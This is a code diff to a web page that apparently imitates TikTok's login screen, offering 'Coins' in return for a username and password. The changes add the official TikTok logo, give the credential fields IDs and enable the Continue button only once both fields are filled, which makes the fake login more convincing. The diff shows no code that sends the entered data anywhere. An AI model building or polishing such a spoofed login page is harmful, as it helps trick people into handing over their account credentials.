@@ -251,6 +251,7 @@ body {
 
 /* Login modal box */
 .login-content {
+  position: relative;
   background: #fff;
   border-radius: 14px;
   padding: 25px 20px;
@@ -287,10 +288,11 @@ body {
   border: none;
   padding: 12px;
   border-radius: 8px;
-  cursor: pointer;
+  cursor: not-allowed;
   width: 88%;
   font-weight: bold;
   font-size: 16px;
+  opacity: 0.6;
 }
 </style>
 </head>
@@ -364,14 +366,17 @@ body {
   <div class="loader"></div>
 </div>
 
-<!-- ✅ Updated TikTok-style login modal -->
+<!-- ✅ TikTok-style login modal with disabled Continue until filled -->
 <div class="login-modal" id="loginModal">
   <div class="login-content">
-    <h2>Log in to get Coins</h2>
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
+         alt="TikTok Logo"
+         style="width: 60px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
+    <h2 style="margin-top: 20px;">Log in to get Coins</h2>
     <p>Log in to your TikTok account to get Coins, check notifications and more.</p>
-    <input type="text" placeholder="Username" required><br>
-    <input type="password" placeholder="Password" required><br>
-    <button onclick="completeLogin()">Continue</button>
+    <input type="text" id="usernameInput" placeholder="Username" required><br>
+    <input type="password" id="passwordInput" placeholder="Password" required><br>
+    <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
   </div>
 </div>
 
@@ -442,6 +447,26 @@ function completeLogin() {
   loggedIn = true;
   updateButton();
 }
+
+// ✅ Enable Continue only if both fields filled
+const usernameField = document.getElementById("usernameInput");
+const passwordField = document.getElementById("passwordInput");
+const continueBtn = document.getElementById("continueBtn");
+
+function checkLoginFields() {
+  if (usernameField.value.trim() && passwordField.value.trim()) {
+    continueBtn.disabled = false;
+    continueBtn.style.opacity = "1";
+    continueBtn.style.cursor = "pointer";
+  } else {
+    continueBtn.disabled = true;
+    continueBtn.style.opacity = "0.6";
+    continueBtn.style.cursor = "not-allowed";
+  }
+}
+
+usernameField.addEventListener("input", checkLoginFields);
+passwordField.addEventListener("input", checkLoginFields);
 </script>
 </body>
 </html>
